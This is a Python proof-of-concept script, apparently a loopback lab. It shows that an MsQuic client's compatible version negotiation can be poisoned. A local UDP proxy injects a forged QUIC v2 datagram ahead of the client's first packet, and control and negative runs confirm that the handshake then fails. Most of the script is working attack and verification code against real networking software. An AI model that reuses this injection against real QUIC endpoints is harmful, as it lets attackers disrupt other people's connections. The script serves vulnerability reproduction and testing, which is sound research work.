#!/usr/bin/env python3
"""Loopback lab: MsQuic compatible-VN commits Initial keys before AEAD."""

from __future__ import annotations

import os
import signal
import socket
import subprocess
import sys
import threading
import time

WITNESS = "MSQUIC-COMPAT-VN-KEY-POISON-WITNESS"
PROXY_HOST = "127.0.0.1"
PROXY_PORT = 18150
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 18151
INJECT_V2 = bytes([0xF0, 0x6B, 0x33, 0x43, 0xCF, 0x00, 0x00])
INJECT_NOISE = bytes([0xF0, 0x11, 0x22, 0x33, 0x44, 0x00, 0x00])
QUICSAMPLE = os.environ.get("QUICSAMPLE", "/opt/msquic/quicsample")
CERT = "/certs/server.cert"
KEY = "/certs/server.key"


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> None:
    log(f"FAIL MSQUIC-COMPAT-VN-KEY-POISON {reason}")
    sys.exit(1)


def saw_connected(text: str) -> bool:
    for line in text.splitlines():
        if "[conn]" in line and "Connected" in line:
            return True
    return False


class LineCollector:
    def __init__(self, proc: subprocess.Popen[str]) -> None:
        self.lines: list[str] = []
        self._lock = threading.Lock()
        self._proc = proc
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def _run(self) -> None:
        stdout = self._proc.stdout
        if stdout is None:
            return
        for line in stdout:
            with self._lock:
                self.lines.append(line)

    def text(self) -> str:
        with self._lock:
            return "".join(self.lines)


class UdpProxy:
    def __init__(self, inject: bytes | None) -> None:
        self.inject = inject
        self.stop = threading.Event()
        self.client_ephemeral: tuple[str, int] | None = None
        self.injected = False
        self.first_pkt_len = 0
        self.c2s = 0
        self.s2c = 0
        self.sock: socket.socket | None = None
        self.thread: threading.Thread | None = None
        self.lock = threading.Lock()

    def start(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((PROXY_HOST, PROXY_PORT))
        sock.settimeout(0.1)
        self.sock = sock
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()

    def _loop(self) -> None:
        sock = self.sock
        assert sock is not None
        server_ep = (SERVER_HOST, SERVER_PORT)
        while not self.stop.is_set():
            try:
                data, addr = sock.recvfrom(65535)
            except socket.timeout:
                continue
            except OSError:
                break
            from_server = addr[0] == SERVER_HOST and addr[1] == SERVER_PORT
            if from_server:
                with self.lock:
                    client = self.client_ephemeral
                    if client:
                        self.s2c += 1
                if client:
                    try:
                        sock.sendto(data, client)
                    except OSError:
                        pass
                continue
            with self.lock:
                first = self.client_ephemeral is None
                if first:
                    self.client_ephemeral = addr
                    self.first_pkt_len = len(data)
                self.c2s += 1
            if first and self.inject:
                try:
                    sock.sendto(self.inject, addr)
                    self.injected = True
                except OSError:
                    pass
            try:
                sock.sendto(data, server_ep)
            except OSError:
                pass

    def close(self) -> None:
        self.stop.set()
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
        if self.thread is not None:
            self.thread.join(timeout=2)


def terminate(proc: subprocess.Popen[str] | None) -> None:
    if proc is None or proc.poll() is not None:
        return
    try:
        proc.send_signal(signal.SIGTERM)
        proc.wait(timeout=2)
    except Exception:
        try:
            proc.kill()
            proc.wait(timeout=2)
        except Exception:
            pass


def start_server() -> subprocess.Popen[str]:
    env = os.environ.copy()
    env["LD_LIBRARY_PATH"] = "/opt/msquic:" + env.get("LD_LIBRARY_PATH", "")
    return subprocess.Popen(
        [
            QUICSAMPLE,
            "-server",
            f"-cert_file:{CERT}",
            f"-key_file:{KEY}",
            f"-port:{SERVER_PORT}",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        env=env,
    )


def wait_listening(collector: LineCollector, proc: subprocess.Popen[str], timeout: float) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        if "Server listening" in collector.text():
            return True
        if proc.poll() is not None:
            return False
        time.sleep(0.05)
    return "Server listening" in collector.text()


def run_client(timeout: float, stop_on_connected: bool) -> str:
    env = os.environ.copy()
    env["LD_LIBRARY_PATH"] = "/opt/msquic:" + env.get("LD_LIBRARY_PATH", "")
    proc = subprocess.Popen(
        [
            QUICSAMPLE,
            "-client",
            "-unsecure",
            "-target:127.0.0.1",
            f"-port:{PROXY_PORT}",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        env=env,
    )
    collector = LineCollector(proc)
    deadline = time.time() + timeout
    try:
        while time.time() < deadline:
            if proc.poll() is not None:
                break
            if stop_on_connected and saw_connected(collector.text()):
                break
            time.sleep(0.05)
    finally:
        terminate(proc)
        time.sleep(0.05)
    return collector.text()


def run_phase(
    name: str,
    inject: bytes | None,
    client_timeout: float,
    stop_on_connected: bool,
) -> tuple[bool, str | None, bool, str]:
    log(
        f"== phase {name} inject={inject.hex() if inject else 'none'} timeout={client_timeout}s =="
    )
    proxy = UdpProxy(inject)
    server = None
    server_collector = None
    try:
        server = start_server()
        server_collector = LineCollector(server)
        if not wait_listening(server_collector, server, 6.0):
            log(f"IOC {name}-server-start-failed")
            log(server_collector.text())
            return False, None, False, ""
        proxy.start()
        time.sleep(0.15)
        out = run_client(client_timeout, stop_on_connected)
        connected = saw_connected(out)
        with proxy.lock:
            ephemeral = proxy.client_ephemeral
            injected = proxy.injected
            first_len = proxy.first_pkt_len
            c2s = proxy.c2s
            s2c = proxy.s2c
        ep_s = f"{ephemeral[0]}:{ephemeral[1]}" if ephemeral else None
        log(f"IOC phase={name} connected={int(connected)} injected={int(injected)}")
        log(f"IOC phase={name} client_ephemeral={ep_s} first_pkt_len={first_len} c2s={c2s} s2c={s2c}")
        for line in out.splitlines():
            log(f"IOC {name}-client {line}")
        if server_collector is not None:
            for line in server_collector.text().splitlines()[:40]:
                log(f"IOC {name}-server {line}")
        return connected, ep_s, injected, out
    finally:
        proxy.close()
        terminate(server)
        time.sleep(0.25)


def main() -> None:
    if not os.path.isfile(QUICSAMPLE) or not os.access(QUICSAMPLE, os.X_OK):
        fail(f"quicsample missing path={QUICSAMPLE}")
    if not os.path.isfile(CERT) or not os.path.isfile(KEY):
        fail("server cert/key missing")

    control_connected, control_ep, _, _ = run_phase(
        "CONTROL", None, 8.0, True
    )
    if not control_connected:
        log("control_connected=0")
        log("inject_connected=")
        log("negative_connected=")
        log(f"inject_hex={INJECT_V2.hex()}")
        log(f"client_ephemeral={control_ep}")
        fail("control handshake did not Connected (environment)")

    inject_connected, inject_ep, inject_sent, _ = run_phase(
        "INJECT", INJECT_V2, 5.0, False
    )
    if not inject_sent or inject_ep is None:
        log(f"control_connected={int(control_connected)}")
        log(f"inject_connected={int(inject_connected)}")
        log("negative_connected=")
        log(f"inject_hex={INJECT_V2.hex()}")
        log(f"client_ephemeral={inject_ep}")
        fail("inject datagram was not sent from proxy 4-tuple")

    negative_connected, negative_ep, negative_sent, _ = run_phase(
        "NEGATIVE", INJECT_NOISE, 8.0, True
    )

    ephemeral = inject_ep or negative_ep or control_ep
    log(f"control_connected={int(control_connected)}")
    log(f"inject_connected={int(inject_connected)}")
    log(f"negative_connected={int(negative_connected)}")
    log(f"inject_hex={INJECT_V2.hex()}")
    log(f"client_ephemeral={ephemeral}")

    if inject_connected:
        fail("inject v2 still Connected (keys not poisoned)")
    if not negative_sent:
        fail("negative inject datagram was not sent")
    if not negative_connected:
        fail("negative noise handshake did not Connected")

    log(f"SUCCESS {WITNESS}")


if __name__ == "__main__":
    main()
